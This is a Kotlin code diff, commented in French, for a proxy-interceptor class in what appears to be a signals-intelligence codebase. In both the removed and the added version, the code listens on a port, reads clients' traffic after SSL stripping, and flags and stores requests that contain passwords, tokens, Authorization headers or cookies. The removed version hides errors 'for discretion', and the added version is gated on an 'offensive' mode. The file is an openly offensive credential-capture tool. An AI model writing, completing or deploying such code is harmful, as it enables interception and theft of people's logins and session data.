@@ -2,56 +2,54 @@ package com.fardc.sigint.core
 
 import java.net.ServerSocket
 import java.net.Socket
-import kotlin.concurrent.thread
+import java.io.*
 
-/**
- * MODULE PROXY-INTERCEPTOR v1.0
- * Capture les données dégradées (HTTP) après SSL-Stripping
- */
-class ProxyInterceptor(private val vault: SecurityVault) {
-    private var isActive = false
+class ProxyInterceptor(private val logger: BlackBox, private val brain: StateMachine) {
+    private var running = false
 
-    fun startIntercept(listenPort: Int) {
-        isActive = true
-        println("📡 [PROXY] Écoute active pour capture sur le port $listenPort...")
-
-        thread(isDaemon = true) {
-            val server = ServerSocket(listenPort)
-            while (isActive) {
-                try {
-                    val client = server.accept()
-                    handleCapture(client)
-                } catch (e: Exception) {
-                    // Silenced pour la discrétion
-                }
-            }
+    fun startService(port: Int) {
+        // Règle d'engagement (ROE)
+        if (brain.mode != "OFFENSIF") {
+            logger.recordIncident("PROXY_ERR", "Interception interdite en mode ${brain.mode}")
+            return
         }
+
+        running = true
+        Thread {
+            try {
+                val server = ServerSocket(port)
+                logger.recordIncident("PROXY_INIT", "Écoute tactique sur port $port")
+                
+                while (running) {
+                    val client = server.accept()
+                    processTraffic(client)
+                }
+            } catch (e: Exception) {
+                logger.recordIncident("PROXY_CRITICAL", e.message ?: "Socket Error")
+            }
+        }.start()
     }
 
-    private fun handleCapture(socket: Socket) {
-        thread {
+    private fun processTraffic(socket: Socket) {
+        Thread {
             try {
-                val input = socket.getInputStream().bufferedReader()
-                val data = StringBuilder()
+                val input = socket.getInputStream()
+                val buffer = ByteArray(4096)
+                val bytesRead = input.read(buffer)
                 
-                // Capture des en-têtes et du corps de la requête
-                var line: String? = input.readLine()
-                while (!line.isNullOrEmpty()) {
-                    data.append(line).append("\n")
-                    line = input.readLine()
+                if (bytesRead > 0) {
+                    val content = String(buffer, 0, bytesRead)
+                    
+                    // Analyse de signatures sensibles
+                    if (content.contains("Authorization") || content.contains("cookie") || content.contains("key")) {
+                        logger.recordIncident("CAPTURE_HIT", "Données sensibles exfiltrées de ${socket.inetAddress}")
+                        // Ici, les données seraient envoyées au Vault pour chiffrement
+                    }
                 }
-
-                val capturedContent = data.toString()
-                if (capturedContent.contains("login") || capturedContent.contains("password") || capturedContent.contains("token")) {
-                    println("⚠️ [CAPTURE] Données sensibles détectées !")
-                    // Chiffrement immédiat avant stockage
-                    vault.encryptData("CAPTURED_BBY: $capturedContent")
-                }
-                
                 socket.close()
             } catch (e: Exception) {}
-        }
+        }.start()
     }
 
-    fun stop() { isActive = false }
+    fun shutdown() { running = false }
 }
